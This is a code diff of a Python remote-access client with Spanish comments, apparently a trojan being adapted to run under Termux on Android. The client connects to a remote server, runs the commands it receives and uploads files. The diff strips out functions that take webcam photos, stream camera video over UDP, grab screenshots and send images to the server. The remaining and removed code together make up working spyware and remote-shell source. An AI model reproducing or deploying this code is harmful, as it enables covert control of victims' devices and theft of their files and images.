@@ -6,15 +6,12 @@ import re
 import pickle
 import struct
 import requests
-import cv2
 import platform
-import pyscreenshot
 from time import sleep
 from subprocess import Popen, PIPE
 from zipfile import ZipFile
 from cryptography.fernet import Fernet
 from random import randint
-from udp import UDP
 
 # Clase client-TCP
 class TCP:
@@ -28,10 +25,7 @@ class TCP:
         # chunk --> 4MB para enviar informacion
         self.__chunk = 4194304
         self.__myOs = platform.system().lower()
-        if self.__myOs == "windows":
-            self.__home = f"C:\\Users\\{getpass.getuser()}"
-        if self.__myOs == "linux":
-            self.__home = f"/home/{getpass.getuser()}"
+        self.__home = f"/data/data/com.termux/files/home"
         self.__userName = getpass.getuser()
 
     def conectar(self):
@@ -97,19 +91,6 @@ class TCP:
         sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
         sock.settimeout(3)
         return sock
-
-    # Funcion para regresar si un archivo es una imagen
-    # ubicacion --> ubicacion del archivo
-    def isImage(self, ubicacion):
-        ext = [".jpg", ".png", ".jpeg", ".webp"]
-        imagen = False
-        for i in ext:
-            if ubicacion.lower().endswith(i):
-                imagen = True
-                break
-
-        # Se regresa si el archivo es imagen o no
-        return imagen
 
     # Funcion para enviar datos
     # info --> informacion a enviar
@@ -376,96 +357,6 @@ class TCP:
         self.__sock.send(b'ok')
         self.recibirArchivo(destino)
         self.__sock.send(f"[*] Archivo \"{destino}\" creado".encode())
-
-    # Funcion para enviar una imagen al servidor
-    # cmd --> comando recibido
-    def image(self, cmd):
-        if re.search(r"\s-r\s?", cmd):
-            imagenes = []
-            for i in os.listdir(os.getcwd()):
-                archivo = f"{os.getcwd()}/{i}"
-                if os.path.isfile(archivo) and self.isImage(archivo):
-                    imagenes.append(archivo)
-
-            num = randint(0, len(imagenes)-1)
-            imagen = imagenes[num]
-
-        else:
-            params = self.parametros(cmd, r"(\s-[i]+[= ])", r"\s-[xygnmc012789]+\s?")[0]
-            imagen = params['-i']
-
-        if os.path.isfile(imagen) and self.isImage(imagen):
-            self.__sock.send("[+] info: ok".encode())
-            
-            self.__sock.recv(8)
-            nombre = self.getNombre(imagen)
-            self.__sock.send(nombre.encode())
-
-            self.__sock.recv(8)
-            archivo = open(imagen, 'rb')
-            info = archivo.read()
-            archivo.close()
-            self.enviarDatos(info)
-
-        else:
-            self.__sock.send(f"[!] warning: Imagen \"{imagen}\" no encontrada".encode())
-
-    # Funcion para tomar una foto y enviarla al servidor
-    # cmd --> comando recibido
-    def pic(self, cmd):
-        params = self.parametros(cmd, r"(\s-c[= ])", r"\s-s\s?")[0]
-        camara = int(params['-c'])
-
-        if self.__myOs.lower() == "windows":
-            captura = cv2.VideoCapture(camara, cv2.CAP_DSHOW)
-        else:
-            captura = cv2.VideoCapture(camara)
-
-        leido, frame = captura.read()
-        captura.release()
-
-        if leido:
-            self.__sock.send("[+] info: ok".encode())
-
-            self.__sock.recv(8)
-            frame = cv2.imencode(".jpg", frame)[1]
-            self.enviarDatos(frame)
-        
-        else:
-            self.__sock.send(f"[!] warning: Camara \"{camara}\" no encontrada".encode())
-
-    # Funcion para enviar video de la camara al servidor
-    # cmd --> comando recibido
-    def captura(self, cmd):
-        params = self.parametros(cmd, r"(\s-c[= ])")[0]
-        
-        camara = int(params['-c'])
-        udp = UDP(self.__host, self.__newPort, self.__myOs)
-
-        if self.__myOs == "windows":
-            captura = cv2.VideoCapture(camara, cv2.CAP_DSHOW)
-        else:
-            captura = cv2.VideoCapture(camara)
-        leido = captura.read()[0]
-        captura.release()
-
-        if leido:
-            self.__sock.send("[+] info: ok".encode())
-            try:
-                udp.conectar()
-                self.__sock.recv(8)
-                udp.captura(camara)
-                udp.close()
-                captura.release()
-                self.__sock.send("[+] info: client-UDP desconectado".encode())
-            except:
-                udp.close()
-                captura.release()
-                self.__sock.send("[+] info: client-UDP desconectado".encode())
-        else:
-            udp.close()
-            captura.release()
-            self.__sock.send(f"[!] warning: Camara \"{camara}\" no encontrada".encode())
 
     # Funcion para enviar un directorio al servidor
     # cmd --> comando recibido
@@ -784,25 +675,6 @@ class TCP:
                     self.enviarDatos(info[i:i+self.__chunk].encode())
                     i += self.__chunk
 
-    def screenShot(self, cmd):
-        params = self.parametros(cmd, r"(\s-[dnot]+[= ])")[0]
-        directorio = params['-d'] if '-d' in params.keys() else '.'
-
-        n = int(params['-n']) if '-n' in params.keys() else 1
-        t = float(params['-t']) if '-t' in params.keys() else 0.0
-
-        ubicacion = f"{directorio}/ss.png"
-        i = 0
-        while i < n:
-            screenshot = pyscreenshot.grab()
-            screenshot.save(ubicacion)
-            self.__sock.send(b'ok')
-            self.enviarArchivo(ubicacion)
-
-            os.remove(ubicacion)
-            sleep(t)
-            i += 1
-
     # Funcion para recibir y evaluar comandos
     def shell(self):
         while True:
@@ -860,36 +732,6 @@ class TCP:
 
                     except:
                         raise Exception('sft error')
-
-                # img
-                elif cmd.lower()[:3] == "img":
-                    try:
-                        # Se manda a llamar a la funcion
-                        # 'self.image'
-                        self.image(cmd)
-
-                    except:
-                        raise Exception('img error')
-
-                # pic
-                elif cmd.lower()[:3] == "pic":
-                    try:
-                        # Se manda a llamar a la funcion
-                        # 'self.pic'
-                        self.pic(cmd)
-
-                    except:
-                        raise Exception('pic error')
-
-                # cap
-                elif cmd.lower()[:3] == "cap":
-                    try:
-                        # Se manda a llamar a la funcion
-                        # 'self.captura'
-                        self.captura(cmd)
-
-                    except:
-                        raise Exception('cap error')
 
                 # sdf
                 elif cmd.lower()[:3] == "sdf":
@@ -981,14 +823,6 @@ class TCP:
 
                     except:
                         raise Exception('save error')
-
-                # ss
-                elif cmd.lower()[:2] == "ss":
-                    try:
-                        self.screenShot(cmd)
-
-                    except:
-                        raise Exception('ss error')
 
                 # cmd
                 else:
